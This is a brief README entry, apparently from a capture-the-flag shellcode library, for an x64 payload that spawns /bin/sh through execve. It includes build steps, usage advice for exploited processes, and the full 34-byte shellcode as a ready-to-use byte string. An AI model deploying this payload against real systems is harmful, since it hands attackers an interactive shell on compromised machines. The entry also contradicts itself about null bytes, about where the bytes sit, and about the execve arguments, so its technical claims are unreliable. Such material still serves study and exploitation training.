# execve (x64)

## What it does
Spawns `/bin/sh` by calling `execve("/bin/sh", NULL, NULL)` directly via syscall.
The classic shellcode — gives you an interactive shell if stdin/stdout are
connected to the exploited process.

## Syscalls used
- `execve` (59)

## When to use it
Default go-to when there's no seccomp filter blocking `execve`/`execl`-style
syscalls and the goal is a straight shell. Not usable when the challenge
drops shell-spawning syscalls (then see `orw` or `openat_sendfile`).

## Constraints / bad chars
- Contains null bytes (`\x00` appears implicitly through zeroed registers,
  though none show up literally in the final byte stream above).
- Not alphanumeric / printable-safe as-is — would need re-encoding for
  charset-restricted inputs.

## Size
34 bytes

## Build
    nasm -f elf64 execve.asm -o execve.o
    ld execve.o -o execve

## Bytes
    b"\x48\x83\xec\x64\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x89\xc2\xb0\x3b\x0f\x05"
